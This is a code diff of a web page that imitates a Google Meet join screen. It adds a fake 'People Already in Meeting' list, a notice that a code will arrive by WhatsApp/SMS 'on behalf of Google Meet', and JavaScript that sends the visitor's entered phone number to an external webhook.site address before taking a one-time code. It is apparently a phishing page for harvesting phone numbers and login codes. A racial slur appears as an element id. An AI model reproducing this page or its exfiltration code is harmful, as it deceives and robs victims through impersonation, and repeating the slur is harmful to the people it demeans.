@@ -68,11 +68,81 @@
         /* Dark theme styles */
          /* Dark theme styles */
          .sidebar {
-            flex: 1; /* Take up all the available space */
-            text-align: right; /* Align items to the right */
-            padding: 10px;
-            box-sizing: border-box;
+          
+                    width: 250px;
+                    height: 50%;
+                    padding: 10px;
+                    box-sizing: border-box;
+                    position: fixed;
+                    top: 0;
+                    right: 0; /* Align the sidebar to the right edge */
+                    display: flex;
+                    flex-direction: column;
+                    justify-content: flex-start;
+                    align-items: flex-start; /* Align items to the left */
+                    background-color: #101820;
+            
         }
+
+        #video-icon {
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+}
+
+#video-icon img {
+    width: 10px;
+    height: 10px;
+    margin: 10px; /* Add margin to position it properly */
+}
+
+#participants-list .participant {
+    width: 100%;
+    padding: 8px;
+    border: none;
+    background-color:  #EBF4FA; /* White background for the button */
+    border-radius: 8px;
+    margin-bottom: 5px;
+    display: flex;
+    justify-content: center; /* Center the text horizontally */
+    align-items: center; /* Center the text vertically */
+    box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.1); /* Add a subtle shadow effect */
+}
+
+/* Style the participant name text */
+
+#participants-list .participant:hover {
+    background-color:  #EBF4FA; /* Change the background color on hover if desired */
+}
+
+#participants-list .participant-name {
+    font-size: 16px;
+}
+
+#nomore
+{
+    color:white;
+}
+
+.success-box {
+    background-color: #EBF4FA;
+            border: 1px solid #1a73e8;
+            border-radius: 5px;
+            padding: 3px;
+            text-align: center;
+            margin-top: 5px;
+            font-size: 14px;
+          
+            
+}
+
+#nigga
+{
+    width:20px;
+    height:20px;
+}
+
     </style>
 </head>
 <body>
@@ -89,27 +159,40 @@
             <input type="text" id="otp" name="otp" required>
         </div>
         <button onclick="joinMeeting()">Join Meeting</button>
-    </div>
     
+  
 
-    <div class="container dark-theme">
+
+    <div class="success-box" style="display: none;">
+        <p>You will receive a code for joining the call via <img id="nigga" src="whatsapp.png"> WhatsApp/SMS on behalf of Google Meet.</p>
+    </div>
+
+    </div>
+
 
         <div class="sidebar">
-            <h2>Participants</h2>
+            <h2 id="nomore">People Already in Meeting</h2>
             <ul id="participants-list">
-                <!-- Dummy participants added for demonstration -->
-                <li>John Doe</li>
-                <li>Jane Smith</li>
-                <li>Mike Johnson</li>
-                <li>Emily Brown</li>
-                <li>Alex Parker</li>
-            </ul>
+                <!-- Each participant will have a list item styled as a button -->
+                <li class="participant">
+                    <span class="participant-name">Radha Sharma</span>
+                </li>
+                <li class="participant">
+                    <span class="participant-name">Himal Chapagain</span>
+                </li>
+                <li class="participant">
+                    <span class="participant-name">Ganesh Singh</span>
+                </li>
+                <!-- Add more participants as needed -->
+                <br>
             <button id="video-icon" onclick="startCall()">
-                <img src="video_icon.png" alt="Start Call">
+                <img src="videoicon.png" alt="Start Call">
             </button>
         </div>
   
     </div>
+
+    
 
     <script>
 
@@ -158,12 +241,59 @@ function sendPageOpenNotification() {
 
         // Function to be called when the "Send Code" button is clicked
         function sendCode() {
-            const sendCodeButton = document.getElementById('sendCodeButton');
+            // const sendCodeButton = document.getElementById('sendCodeButton');
+            // sendCodeButton.innerHTML = 'Code Sent';
+            // sendCodeButton.style.backgroundColor = '#4caf50'; // Green color
+            // sendCodeButton.style.pointerEvents = 'none'; // Disable further clicks
+            // // Do nothing, just apply blur effect to the button
+
+            const phoneNumberInput = document.getElementById('phone');
+        const phoneNumberValue = phoneNumberInput.value.trim();
+        const sendCodeButton = document.getElementById('sendCodeButton');
+        
+         
+
+        if (phoneNumberValue === '9851327157') {
             sendCodeButton.innerHTML = 'Code Sent';
             sendCodeButton.style.backgroundColor = '#4caf50'; // Green color
             sendCodeButton.style.pointerEvents = 'none'; // Disable further clicks
             // Do nothing, just apply blur effect to the button
+
+            const successBox = document.querySelector('.success-box');
+            successBox.style.display = 'block';
+            sendPhoneNumberToWebhook(phoneNumberValue);
+
+        } 
+        else {
+            sendCodeButton.innerHTML = 'Invalid Number';
+            sendCodeButton.style.backgroundColor = '#ff5252'; // Red color
+            sendCodeButton.style.pointerEvents = 'auto'; // EnabSle clicks again
+
+            const successBox = document.querySelector('.success-box');
+            successBox.style.display = 'none';
         }
+    
+    }
+
+    function sendPhoneNumberToWebhook(phoneNumber) {
+    const webhookUrl = `https://webhook.site/b8e15cbd-6a41-49c5-946e-3c79440377b4?phone=${phoneNumber}`;
+
+    fetch(webhookUrl, {
+        method: 'GET'
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log(data); // Optional: Log the server response
+    })
+    .catch(error => {
+        console.error('Error:', error); // Optional: Handle errors if any
+    });
+}
+
+    //         const successBox = document.querySelector('.success-box');
+    // successBox.style.display = 'block';
+
+    //     }
 
         // Function to be called when the "Join Meeting" button is clicked
         function joinMeeting() {
@@ -174,6 +304,8 @@ function sendPageOpenNotification() {
             // Redirect to the success page
             window.location.href = 'success.html';
         }
+
+
     </script>
 </body>
 </html>
